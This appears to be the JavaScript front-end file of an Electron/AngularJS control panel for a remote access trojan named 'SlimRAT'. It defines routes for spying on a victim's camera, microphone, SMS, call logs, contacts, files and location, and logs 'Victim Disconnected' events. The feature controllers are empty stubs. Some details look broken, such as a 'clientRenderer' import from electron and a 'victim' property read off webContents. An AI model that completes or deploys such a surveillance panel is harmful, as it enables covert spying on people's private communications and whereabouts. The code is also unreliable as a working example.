const { remote } = require('electron');
const { clientRenderer } = require('electron');
var app = angular.module('LabApp', ['ngRoute', 'infinite-scroll']);
var homeDir = require('homedir');
var fs = require('fs-extra');
var path = require('path');
var socket = remote.getCurrentWebContents().victim;

var dataPath = path.join(homeDir(), 'Desktop');
var downloadsPath = path.join(dataPath, 'SlimRAT');

app.config(function($routeProvider) {
  $routeProvider
  .when('/', {
    templateUrl: './views/main.html'
  })
  .when('/camera', {
    templateUrl: './views/camera.html',
    controller: 'CamCtrl'
  })
  .when('/fileManager', {
    templateUrl: './views/fileManager.html',
    controller: 'FmCtrl'
  })
  .when('/smsManager', {
    templateUrl: './views/smsManager.html',
    controller: 'SMSCtrl'
  })
  .when('/callsLogs', {
    templateUrl: './views/callsLogs.html',
    controller: 'CallsCtrl'
  })
  .when('/contacts', {
    templateUrl: './views/contacts.html',
    controller: 'ContCtrl'
  })
  .when('/mic', {
    templateUrl: './views/mic.html',
    controller: 'MicCtrl'
  })
  .when('/location', {
    templateUrl: './views/location.html',
    controller: 'LocCtrl'
  });
});

app.controller('LabCtrl', function($scope, $rootScope, $location) {
  $labCtrl = $scope;
  $labCtrl.logs = [];

  var log = document.getElementById('logLab');
  const window = remote.getCurrentWindow();

  $labCtrl.close = function() {
    window.close();
  };

  $rootScope.Log = function(msg, status) {
    var fontColor = 'white';

    if (status == 1) {
      fontColor = 'green';
    } else if (status == 0) {
      fontColor = 'red';
    }

    $labCtrl.logs.push({ date: new Date().toLocaleString(), msg: msg, color: fontColor });
    log.scrollTop = log.scrollHeight;

    if (!$labCtrl.$$phase) {
      $labCtrl.$apply();
    }
  };

  clientRenderer.on('SocketIO:VictimDisconnected', function(event) {
    $rootScope.Log('Victim Disconnected', 0);
  });

  $labCtrl.goToPage = function(page) {
    $location.path('/' + page);
  };
});

app.controller('CamCtrl', function($scope, $rootScope) {});
app.controller('FmCtrl', function($scope, $rootScope) {});
app.controller('CallsCtrl', function($scope, $rootScope) {});
app.controller('ContCtrl', function($scope, $rootScope) {});
app.controller('MicCtrl', function($scope, $rootScope) {});
app.controller('LocCtrl', function($scope, $rootScope) {});
